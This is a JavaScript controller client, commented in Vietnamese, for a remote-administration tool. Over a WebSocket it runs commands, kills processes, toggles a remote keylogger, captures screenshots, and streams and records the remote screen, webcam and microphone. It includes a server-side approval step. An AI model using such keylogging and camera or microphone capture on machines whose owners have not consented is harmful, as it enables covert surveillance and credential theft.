/**
 * CLIENT CORE (STANDALONE VERSION - WITH AUDIO SUPPORT)
 * Hỗ trợ phát âm thanh PCM và ghi âm vào video
 */

// === 1. STORE & CONSTANTS ===
let DEVICE_ID = localStorage.getItem("rc_device_id");
if (!DEVICE_ID) {
  DEVICE_ID = "CL_" + Math.random().toString(16).substring(2, 6);
  localStorage.setItem("rc_device_id", DEVICE_ID);
}

const store = {
  db: null,
  DEVICE_ID: DEVICE_ID,
  clientIP: null,
  socketReady: false,
  socket: null,
  isScreenStreamOn: false,
  isCamStreamOn: false,
  autoShotInt: null,
  keylogInt: null,
  isSavingScreenshot: false,
  // Audio State
  isMuted: false,
  hasAudioContext: false,
};

const EventBus = new EventTarget();

// === 2. AUDIO ENGINE (NEW) ===
let audioCtx = null;
let audioDest = null; // Destination để ghi âm (Record)
let audioGain = null; // Để chỉnh volume (Mute)
let nextAudioTime = 0;

function initAudio() {
  if (store.hasAudioContext) return;
  const AudioCtor = window.AudioContext || window.webkitAudioContext;
  if (!AudioCtor)
    return console.error("Trình duyệt không hỗ trợ Web Audio API");

  audioCtx = new AudioCtor();
  // Tạo node đích để vừa phát ra loa vừa đưa vào Recorder
  audioDest = audioCtx.createMediaStreamDestination();
  audioGain = audioCtx.createGain();

  // Kết nối: Source -> Gain (Mute) -> Destination (Recorder) -> Speaker
  audioGain.connect(audioDest);
  audioGain.connect(audioCtx.destination);

  store.hasAudioContext = true;
  console.log("Audio Engine Initialized");
}

function playPcmData(arrayBuffer) {
  if (!audioCtx || store.isMuted) return;

  // Giả sử server gửi 8-bit PCM Mono 11025Hz (cấu hình "nhẹ" nhất)
  // Nếu server đổi cấu hình, cần sửa tham số ở đây
  const data = new Uint8Array(arrayBuffer);
  const floatBuffer = audioCtx.createBuffer(1, data.length, 11025);
  const channel = floatBuffer.getChannelData(0);

  // Chuyển đổi 8-bit (0-255) sang Float32 (-1.0 đến 1.0)
  for (let i = 0; i < data.length; i++) {
    channel[i] = (data[i] - 128) / 128.0;
  }

  const source = audioCtx.createBufferSource();
  source.buffer = floatBuffer;
  source.connect(audioGain); // Nối vào Gain node

  // Scheduling để phát liên tục không bị vấp
  const now = audioCtx.currentTime;
  if (nextAudioTime < now) nextAudioTime = now;
  source.start(nextAudioTime);
  nextAudioTime += source.buffer.duration;
}

function toggleMute(btn) {
  store.isMuted = !store.isMuted;
  if (audioGain) {
    // Mute bằng cách giảm gain về 0
    audioGain.gain.value = store.isMuted ? 0 : 1;
  }

  if (store.isMuted) {
    btn.textContent = "🔇 Âm thanh: OFF";
    btn.classList.add("muted");
    btn.classList.remove("btn-warning");
  } else {
    btn.textContent = "🔊 Âm thanh: ON";
    btn.classList.add("btn-warning");
    btn.classList.remove("muted");
  }
}

// === 3. UI MODULE ===
function toggleTheme() {
  document.body.classList.toggle("dark-mode");
  localStorage.setItem(
    "theme",
    document.body.classList.contains("dark-mode") ? "dark" : "light"
  );
}
function initTheme() {
  if (localStorage.getItem("theme") === "dark")
    document.body.classList.add("dark-mode");
}
initTheme();

function moveSlider(targetButton) {
  const slider = document.getElementById("tab-slider");
  if (!slider || !targetButton) return;
  slider.style.left = `${targetButton.offsetLeft}px`;
  slider.style.width = `${targetButton.offsetWidth}px`;
}
function handleTabHover(targetButton) {
  moveSlider(targetButton);
}
function handleTabLeave() {
  const activeButton = document.querySelector(".tab-btn.active");
  if (activeButton) moveSlider(activeButton);
}

function logActionUI(msg, success) {
  const list = document.getElementById("actionLogList");
  if (list) {
    const i = document.createElement("div");
    i.className = "log-item " + (success ? "success" : "error");
    i.innerHTML = `<span class="log-time">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
    list.insertBefore(i, list.firstChild);
  }
}
function toggleActionLog() {
  document.getElementById("actionLogList").classList.toggle("minimized");
}

function showTab(id) {
  if (store.isScreenStreamOn || store.isCamStreamOn) {
    logActionUI("Chuyển tab -> Dừng tất cả Stream.", true);
    if (store.isScreenStreamOn) toggleScreenStream(null);
    if (store.isCamStreamOn) toggleCamStream(null);
    sendCommand("STOP_STREAM");
  }
  document
    .querySelectorAll(".tab-content")
    .forEach((el) => el.classList.remove("active"));
  document
    .querySelectorAll(".tab-btn")
    .forEach((el) => el.classList.remove("active"));
  const btn = document.querySelector(`button[onclick="showTab('${id}')"]`);
  if (btn) {
    btn.classList.add("active");
    moveSlider(btn);
  }
  const tabContent = document.getElementById("tab-" + id);
  if (tabContent) tabContent.classList.add("active");
  if (store.socketReady) {
    if (id === "apps") {
      loadApps();
      renderRecents();
    }
    if (id === "procs") loadProcs();
    if (id === "keylog") loadKeylog();
  }
}

function filterTable(tid, col, txt) {
  document
    .querySelectorAll(`#${tid} tbody tr`)
    .forEach(
      (tr) =>
        (tr.style.display = tr.innerText
          .toLowerCase()
          .includes(txt.toLowerCase())
          ? ""
          : "none")
    );
}

// === 4. SOCKET MODULE ===
const responseHandlers = {};
function onCommand(command, handler) {
  responseHandlers[command] = handler;
}

function sendCommand(command, payload = null) {
  if (store.socket && store.socket.readyState === WebSocket.OPEN) {
    store.socket.send(JSON.stringify({ command: command, payload: payload }));
  } else {
    console.error(`Loi: WebSocket chua san sang (dinh goi lenh: ${command})!`);
    EventBus.dispatchEvent(
      new CustomEvent("socket:error", { detail: "WebSocket not ready" })
    );
  }
}

// === 5. FEATURE MODULES ===

// --- Apps & Procs & Keylog (Keep same logic) ---
function handleAppsData(list) {
  const tbody = document.querySelector("#appsTable tbody");
  if (!tbody || !Array.isArray(list)) return;
  tbody.innerHTML = list
    .map((a) => {
      let name = a.path.split("\\").pop() || "Unknown";
      let path = encodeURIComponent(a.path);
      return `<tr><td><strong>${name}</strong><br><span class="app-title">${a.title}</span></td>
      <td><button class="btn-danger" onclick="closeWin('${a.hwnd}', '${path}', '${name}')">Đóng</button></td></tr>`;
    })
    .join("");
}
function loadApps() {
  sendCommand("GET_APPS");
}
function closeWin(h, path, name) {
  if (confirm("Đóng cửa sổ này?")) {
    if (path && path !== "Unknown" && path.length > 3) addRecent(path, name);
    sendCommand("CLOSE_HWND", h);
    logActionUI(`Đóng: ${name}`, true);
    setTimeout(loadApps, 1000);
  }
}
function startCmd(inpId, statId, cmdOverride = null) {
  let val = cmdOverride || document.getElementById(inpId).value.trim();
  if (!val) return;
  const statusEl = document.getElementById(statId);
  if (statusEl) statusEl.textContent = "⏳ ...";
  sendCommand("START_CMD", val);
  let name = val.split("\\").pop();
  addRecent(val, name);
  logActionUI(`Mở: ${name}`, true);
  if (statusEl) statusEl.textContent = "✅ Đã gửi lệnh";
  setTimeout(() => {
    if (document.getElementById("tab-apps").classList.contains("active"))
      loadApps();
  }, 2000);
}
function addRecent(path, name) {
  let r = JSON.parse(sessionStorage.getItem("recents") || "[]");
  r = r.filter((x) => x.path !== path);
  r.unshift({ path, name });
  if (r.length > 8) r.pop();
  sessionStorage.setItem("recents", JSON.stringify(r));
  renderRecents();
}
function renderRecents() {
  const listEl = document.getElementById("recentListTags");
  if (!listEl) return;
  listEl.innerHTML =
    JSON.parse(sessionStorage.getItem("recents") || "[]")
      .map(
        (i) =>
          `<span class="tag" title="${
            i.path
          }" onclick="startCmd(null,'statusApp','${i.path.replace(
            /\\/g,
            "\\\\"
          )}')">🔄 ${i.name}</span>`
      )
      .join("") || "<i>Chưa có</i>";
}
function handleProcsData(list) {
  const tbody = document.querySelector("#procTable tbody");
  if (!tbody || !Array.isArray(list)) return;
  list.sort((a, b) => a.exe.localeCompare(b.exe));
  tbody.innerHTML = list
    .map(
      (p) =>
        `<tr><td>${p.pid}</td><td><strong>${p.exe}</strong></td><td><button class="btn-danger" onclick="kill(${p.pid})">Kill</button></td></tr>`
    )
    .join("");
}
function loadProcs() {
  sendCommand("GET_PROCS");
}
function kill(pid) {
  if (confirm("Kill PID " + pid + "?")) {
    sendCommand("KILL_PID", pid);
    logActionUI(`Kill PID ${pid}`, true);
    setTimeout(loadProcs, 500);
  }
}
function handleKeylogData(payload) {
  const chk = document.getElementById("chkKeylog");
  if (chk) chk.checked = payload.enabled;
  if (payload.log) {
    let area = document.getElementById("logArea");
    area.value += payload.log;
    area.scrollTop = area.scrollHeight;
    sessionStorage.setItem("keylogs", area.value);
  }
}
function loadKeylog() {
  sendCommand("GET_KEYLOG");
}
function toggleKeylog(cb) {
  sendCommand("KEYLOG_SET", cb.checked);
  logActionUI(`Keylog: ${cb.checked ? "BẬT" : "TẮT"}`, true);
  if (cb.checked) {
    if (!store.keylogInt)
      store.keylogInt = setInterval(() => sendCommand("GET_KEYLOG"), 200);
  } else {
    if (store.keylogInt) {
      clearInterval(store.keylogInt);
      store.keylogInt = null;
    }
  }
}
function clearLogs() {
  if (confirm("Xóa log?")) {
    document.getElementById("logArea").value = "";
    sessionStorage.removeItem("keylogs");
    logActionUI("Đã xóa log phím", true);
  }
}

// --- Screen Tab ---
function handleScreenshotData(payload) {
  const imgData = "data:image/jpeg;base64," + payload;
  const imgEl = document.getElementById("screenImg");
  if (imgEl) imgEl.src = imgData;
  if (store.isSavingScreenshot && store.db) {
    fetch(imgData)
      .then((res) => res.blob())
      .then((blob) => {
        store.db
          .transaction(["images"], "readwrite")
          .objectStore("images")
          .add({ blob, date: new Date() });
        logActionUI("Đã chụp & lưu", true);
        loadGallery();
      });
    store.isSavingScreenshot = false;
  }
}
function updateScreen(save = false) {
  store.isSavingScreenshot = save;
  sendCommand("GET_SCREENSHOT");
}
function toggleAutoShot(cb) {
  if (cb.checked) {
    store.isSavingScreenshot = false;
    updateScreen(false);
    store.autoShotInt = setInterval(() => updateScreen(false), 2000);
  } else clearInterval(store.autoShotInt);
}
function loadGallery() {
  if (!store.db) return;
  let h = "";
  store.db
    .transaction(["images"], "readonly")
    .objectStore("images")
    .openCursor(null, "prev").onsuccess = (e) => {
    let c = e.target.result;
    if (c) {
      h += `<div class="gallery-item" onclick="window.open('${URL.createObjectURL(
        c.value.blob
      )}')"><img src="${URL.createObjectURL(
        c.value.blob
      )}" title="${c.value.date.toLocaleString()}"></div>`;
      c.continue();
    } else
      document.getElementById("gallery").innerHTML =
        h || "<small>Trống</small>";
  };
}
function clearGallery() {
  if (confirm("Xóa hết ảnh?") && store.db) {
    store.db
      .transaction(["images"], "readwrite")
      .objectStore("images")
      .clear().onsuccess = () => {
      loadGallery();
      logActionUI("Đã xóa thư viện ảnh", true);
    };
  }
}
function toggleScreenStream(btn) {
  const streamView = document.getElementById("screenStreamView");
  const streamStatus = document.getElementById("screenStreamStatus");
  if (btn === null) {
    store.isScreenStreamOn = false;
    streamView.removeAttribute("src");
    streamView.src = "";
    streamView.style.display = "none";
    const b = document.getElementById("btnToggleScreenStream");
    if (b) {
      b.textContent = "▶️ Bật Stream Màn Hình";
      b.classList.remove("btn-danger");
      b.classList.add("btn-primary");
    }
    if (streamStatus) streamStatus.textContent = "";
    return;
  }
  store.isScreenStreamOn = !store.isScreenStreamOn;
  if (store.isScreenStreamOn) {
    if (store.isCamStreamOn) toggleCamStream(null);
    streamView.alt = "Đang tải luồng...";
    streamView.style.display = "block";
    btn.textContent = "⏹️ Tắt Stream Màn Hình";
    btn.classList.add("btn-danger");
    btn.classList.remove("btn-primary");
    if (streamStatus) streamStatus.textContent = "⏳ Đang kết nối...";
    logActionUI("Bật livestream màn hình", true);
    sendCommand("START_STREAM_SCREEN");
  } else {
    toggleScreenStream(null);
    sendCommand("STOP_STREAM");
    logActionUI("Tắt livestream màn hình", true);
  }
}

// --- Cam Tab (UPDATED WITH AUDIO) ---
let camRecorder = null,
  camChunks = [],
  camInterval = null,
  isCamRec = null,
  camRecTimeout = null;

function toggleRecMode() {
  const mode = document.querySelector('input[name="recMode"]:checked').value;
  document.getElementById("timerInputRow").style.display =
    mode === "timer" ? "flex" : "none";
}
function handleDevicesData(data) {
  const camSelect = document.getElementById("camName");
  if (data.status === "refresh_pending" || data.status === "refresh_busy") {
    if (camSelect && camSelect.options.length === 0)
      camSelect.innerHTML = "<option>⏳ Đang quét...</option>";
    setTimeout(() => sendCommand("GET_DEVICES"), 2000);
    return;
  }
  camSelect.innerHTML = "";
  if (data.video && data.video.length > 0) {
    data.video.forEach((cam) => {
      const opt = document.createElement("option");
      opt.value = cam;
      opt.textContent = cam;
      if (cam.toLowerCase().includes("usb")) opt.selected = true;
      camSelect.appendChild(opt);
    });
  } else
    camSelect.innerHTML = "<option value=''>Không tìm thấy camera</option>";
  if (data.status === "not_ready") loadDevices(true);
}
function loadDevices(force = false) {
  force ? sendCommand("REFRESH_DEVICES") : sendCommand("GET_DEVICES");
}

function recordVideo() {
  const btnVid = document.getElementById("btnVid");
  const btnStream = document.getElementById("btnToggleCamStream");
  const imgView = document.getElementById("camStreamView");
  const canvas = document.getElementById("camRecorderCanvas");
  const stat = document.getElementById("vidStatus");

  if (!store.isCamStreamOn || !imgView.src)
    return alert("Vui lòng BẬT STREAM trước khi quay!");
  if (isCamRec) {
    stopCamRecording();
    return;
  }

  // Init Audio Engine nếu chưa có
  initAudio();
  if (audioCtx.state === "suspended") audioCtx.resume();

  try {
    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext("2d");

    // 1. Lấy Video Stream từ Canvas
    const videoStream = canvas.captureStream(25);

    // 2. Lấy Audio Stream từ Destination (nơi chứa âm thanh remote)
    let audioStream = audioDest.stream;

    // 3. Kết hợp (Mux) thành 1 luồng duy nhất
    const combinedStream = new MediaStream([
      ...videoStream.getVideoTracks(),
      ...audioStream.getAudioTracks(),
    ]);

    try {
      camRecorder = new MediaRecorder(combinedStream, {
        mimeType: "video/webm;codecs=vp8,opus",
      });
    } catch (e) {
      camRecorder = new MediaRecorder(combinedStream);
    }

    camChunks = [];
    camRecorder.ondataavailable = (e) => {
      if (e.data.size > 0) camChunks.push(e.data);
    };
    camRecorder.onstop = () => {
      const blob = new Blob(camChunks, { type: "video/webm" });
      if (store.db) {
        store.db
          .transaction(["videos"], "readwrite")
          .objectStore("videos")
          .add({ blob, date: new Date() });
        loadVidGallery();
        logActionUI("Đã lưu video có tiếng vào thư viện.", true);
      }
    };

    camInterval = setInterval(() => {
      if (imgView.complete && imgView.naturalHeight !== 0)
        ctx.drawImage(imgView, 0, 0, canvas.width, canvas.height);
    }, 40);

    camRecorder.start();
    isCamRec = true;
    if (btnStream) btnStream.disabled = true;

    btnVid.textContent = "⏹️ DỪNG QUAY";
    btnVid.classList.add("btn-danger");
    btnVid.classList.remove("btn-primary");
    const mode = document.querySelector('input[name="recMode"]:checked').value;
    if (mode === "timer") {
      const sec = parseInt(document.getElementById("vidDur").value) || 10;
      stat.innerText = `⏳ Đang quay ${sec} giây...`;
      camRecTimeout = setTimeout(stopCamRecording, sec * 1000);
    } else stat.innerText = "🔴 Đang quay (Có tiếng)...";
  } catch (e) {
    alert("Lỗi: " + e.message);
    isCamRec = false;
    if (btnStream) btnStream.disabled = false;
  }
}

function stopCamRecording() {
  if (camRecorder && camRecorder.state !== "inactive") camRecorder.stop();
  if (camInterval) clearInterval(camInterval);
  if (camRecTimeout) clearTimeout(camRecTimeout);
  isCamRec = false;
  camRecTimeout = null;
  const btnStream = document.getElementById("btnToggleCamStream");
  if (btnStream) btnStream.disabled = false;
  const btnVid = document.getElementById("btnVid");
  btnVid.textContent = "🔴 BẮT ĐẦU QUAY";
  btnVid.classList.remove("btn-danger");
  btnVid.classList.add("btn-primary");
  document.getElementById("vidStatus").innerText = "✅ Đã lưu vào thư viện.";
}

function loadVidGallery() {
  if (!store.db) return;
  let h = "";
  store.db
    .transaction(["videos"], "readonly")
    .objectStore("videos")
    .openCursor(null, "prev").onsuccess = (e) => {
    let c = e.target.result;
    if (c) {
      let u = URL.createObjectURL(c.value.blob);
      h += `<div class="gallery-item video-item"><video src="${u}" controls style="width:100%;height:80px"></video></div>`;
      c.continue();
    } else
      document.getElementById("vidGallery").innerHTML =
        h || "<small>Trống</small>";
  };
}
function clearVideos() {
  if (confirm("Xóa hết video?") && store.db) {
    store.db
      .transaction(["videos"], "readwrite")
      .objectStore("videos")
      .clear().onsuccess = () => {
      loadVidGallery();
      logActionUI("Đã xóa thư viện video", true);
    };
  }
}

function toggleCamStream(btn) {
  const streamView = document.getElementById("camStreamView");
  const streamStatus = document.getElementById("camStreamStatus");
  const muteBtn = document.getElementById("btnMute");

  if (btn === null) {
    store.isCamStreamOn = false;
    streamView.removeAttribute("src");
    streamView.src = "";
    streamView.style.display = "none";
    if (muteBtn) muteBtn.style.display = "none"; // Ẩn nút Mute

    const b = document.getElementById("btnToggleCamStream");
    if (b) {
      b.textContent = "▶️ Bật Stream";
      b.classList.remove("btn-danger");
      b.classList.add("btn-primary");
      b.disabled = false;
    }
    streamStatus.textContent = "";
    if (isCamRec) stopCamRecording();
    return;
  }
  store.isCamStreamOn = !store.isCamStreamOn;
  if (store.isCamStreamOn) {
    if (store.isScreenStreamOn) toggleScreenStream(null);
    const camName = document.getElementById("camName").value;
    if (!camName) {
      alert("Chưa chọn Camera");
      store.isCamStreamOn = false;
      return;
    }

    streamView.src = "";
    streamView.style.display = "block";
    if (muteBtn) muteBtn.style.display = "inline-block"; // Hiện nút Mute

    // KHỞI ĐỘNG AUDIO ENGINE
    initAudio();
    if (audioCtx.state === "suspended") audioCtx.resume();

    btn.textContent = "⏹️ Tắt Stream";
    btn.classList.add("btn-danger");
    btn.classList.remove("btn-primary");
    streamStatus.textContent = "⏳ Đang kết nối...";
    sendCommand("START_STREAM_CAM", { cam: camName, audio: "mic" });
  } else {
    toggleCamStream(null);
    sendCommand("STOP_STREAM");
  }
}

// --- Sys Tab & Startup (Same as before) ---
function sendPower(act) {
  if (confirm("CHẮC CHẮN " + act.toUpperCase() + " MÁY TÍNH?")) {
    sendCommand("POWER_CMD", act);
    logActionUI("Lệnh nguồn: " + act, true);
  }
}
onCommand("GET_APPS", handleAppsData);
onCommand("GET_PROCS", handleProcsData);
onCommand("GET_DEVICES", handleDevicesData);
onCommand("GET_KEYLOG", handleKeylogData);
onCommand("GET_SCREENSHOT", handleScreenshotData);

function showAuthScreen(emoji, message, color) {
  document.body.innerHTML = `<div style="padding:40px;text-align:center;font-size:1.2em;color:${color};background:#222;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;"><div style="font-size:3em;margin-bottom:20px;">${emoji}</div><pre>${message}</pre><div style="font-size:0.8em;color:#888;margin-top:20px;">ID: ${store.DEVICE_ID}</div></div>`;
}
function startConnection() {
  let ip = document.getElementById("ipInput").value.trim();
  if (!ip) return alert("Vui lòng nhập IP!");
  ip = ip.replace(/^(ws|http)s?:\/\//, "");
  if (ip.endsWith("/")) ip = ip.slice(0, -1);
  if (!ip.includes(":")) ip += ":8080";
  store.clientIP = ip;
  addToHistory(ip);
  document.getElementById("client-info").innerText = "CONNECTING...";
  store.socket = new WebSocket(`ws://${ip}?id=${store.DEVICE_ID}`);
  store.socket.onopen = () => console.log("WS Open");

  store.socket.onmessage = (event) => {
    // BINARY DATA (Image OR Audio)
    if (event.data instanceof Blob || event.data instanceof ArrayBuffer) {
      // NOTE: Hiện tại Server chỉ gửi ảnh.
      // Khi Server được cập nhật để gửi Audio, logic phân biệt sẽ nằm ở đây.
      // Ví dụ: Byte đầu tiên là 0x01 (Video) hoặc 0x02 (Audio).
      // Tạm thời code này xử lý ảnh như cũ, và chừa chỗ cho Audio.

      // GIẢ LẬP: Nếu blob < 2000 bytes thì coi là audio chunk (Ví dụ)
      if (event.data.size && event.data.size < 2000 && store.hasAudioContext) {
        event.data.arrayBuffer().then(playPcmData);
        return;
      }

      const url = URL.createObjectURL(
        new Blob([event.data], { type: "image/jpeg" })
      );
      const screenView = document.getElementById("screenStreamView");
      const camView = document.getElementById("camStreamView");
      if (store.isScreenStreamOn && screenView) {
        screenView.src = url;
        screenView.onload = () => URL.revokeObjectURL(url);
      } else if (store.isCamStreamOn && camView) {
        camView.src = url;
        camView.onload = () => URL.revokeObjectURL(url);
      }
      return;
    }
    // JSON
    try {
      const msg = JSON.parse(event.data);
      if (msg.type === "auth")
        EventBus.dispatchEvent(new CustomEvent("socket:auth", { detail: msg }));
      else if (msg.type === "stream_start") {
        if (store.isScreenStreamOn)
          document.getElementById("screenStreamStatus").textContent =
            "✅ Đã kết nối luồng.";
        if (store.isCamStreamOn)
          document.getElementById("camStreamStatus").textContent =
            "✅ Đã kết nối luồng.";
      } else if (msg.type === "stream_stop") {
        if (store.isScreenStreamOn) toggleScreenStream(null);
        if (store.isCamStreamOn) toggleCamStream(null);
      } else if (msg.type === "error")
        logActionUI(`Lỗi Gateway: ${msg.payload}`, false);
      else if (msg.type === "json")
        if (responseHandlers[msg.command])
          responseHandlers[msg.command](msg.payload);
    } catch (e) {}
  };
  store.socket.onclose = (e) => {
    logActionUI("Mất kết nối", false);
    store.socketReady = false;
    alert("Mất kết nối!");
    location.reload();
  };
  store.socket.onerror = () => logActionUI("Lỗi WebSocket", false);
}

EventBus.addEventListener("socket:auth", (e) => {
  const { status, message } = e.detail;
  if (status === "approved") {
    document.getElementById("login-screen").style.display = "none";
    document.getElementById("main-app").style.display = "block";
    logActionUI("Đã kết nối!", true);
    store.socketReady = true;
    showTab("apps");
    document.getElementById(
      "client-info"
    ).textContent = `ID: ${store.DEVICE_ID}`;
    const req = indexedDB.open("RemoteDB_V2", 2);
    req.onupgradeneeded = (ev) => {
      let db = ev.target.result;
      if (!db.objectStoreNames.contains("images"))
        db.createObjectStore("images", { keyPath: "id", autoIncrement: true });
      if (!db.objectStoreNames.contains("videos"))
        db.createObjectStore("videos", { keyPath: "id", autoIncrement: true });
    };
    req.onsuccess = (ev) => {
      store.db = ev.target.result;
      loadGallery();
      loadVidGallery();
    };
  } else if (status === "pending") {
    store.socketReady = false;
    showAuthScreen("⌛", message, "#ffcc80");
  } else if (status === "rejected") {
    store.socketReady = false;
    showAuthScreen("⛔", message, "#ef9a9a");
  }
});

function loadHistory() {
  const h = JSON.parse(localStorage.getItem("remote_ip_history") || "[]");
  document.getElementById("historyItems").innerHTML =
    h
      .map(
        (ip) =>
          `<div class="history-item" onclick="document.getElementById('ipInput').value='${ip}'"><span>${ip}</span> <span style="color:var(--danger)" onclick="event.stopPropagation();delHistory('${ip}')">×</span></div>`
      )
      .join("") || "<small>Trống</small>";
  if (h.length && !document.getElementById("ipInput").value)
    document.getElementById("ipInput").value = h[0];
}
function addToHistory(ip) {
  let h = JSON.parse(localStorage.getItem("remote_ip_history") || "[]");
  h = h.filter((x) => x !== ip);
  h.unshift(ip);
  if (h.length > 5) h.pop();
  localStorage.setItem("remote_ip_history", JSON.stringify(h));
}
window.delHistory = function (ip) {
  let h = JSON.parse(localStorage.getItem("remote_ip_history") || "[]");
  localStorage.setItem(
    "remote_ip_history",
    JSON.stringify(h.filter((x) => x !== ip))
  );
  loadHistory();
};

if (document.getElementById("lblDeviceId"))
  document.getElementById("lblDeviceId").textContent = store.DEVICE_ID;
const logArea = document.getElementById("logArea");
if (logArea) logArea.value = sessionStorage.getItem("keylogs") || "";
loadHistory();
document.getElementById("ipInput").addEventListener("keypress", (e) => {
  if (e.key === "Enter") startConnection();
});

// Expose globals
window.toggleTheme = toggleTheme;
window.toggleActionLog = toggleActionLog;
window.showTab = showTab;
window.handleTabHover = handleTabHover;
window.handleTabLeave = handleTabLeave;
window.filterTable = filterTable;
window.startCmd = startCmd;
window.loadApps = loadApps;
window.closeWin = closeWin;
window.startConnection = startConnection;
window.loadProcs = loadProcs;
window.kill = kill;
window.updateScreen = updateScreen;
window.toggleAutoShot = toggleAutoShot;
window.clearGallery = clearGallery;
window.toggleScreenStream = toggleScreenStream;
window.toggleKeylog = toggleKeylog;
window.clearLogs = clearLogs;
window.toggleRecMode = toggleRecMode;
window.loadDevices = loadDevices;
window.recordVideo = recordVideo;
window.clearVideos = clearVideos;
window.toggleCamStream = toggleCamStream;
window.sendPower = sendPower;
// EXPOSE MUTE FUNCTION
window.toggleMute = toggleMute;
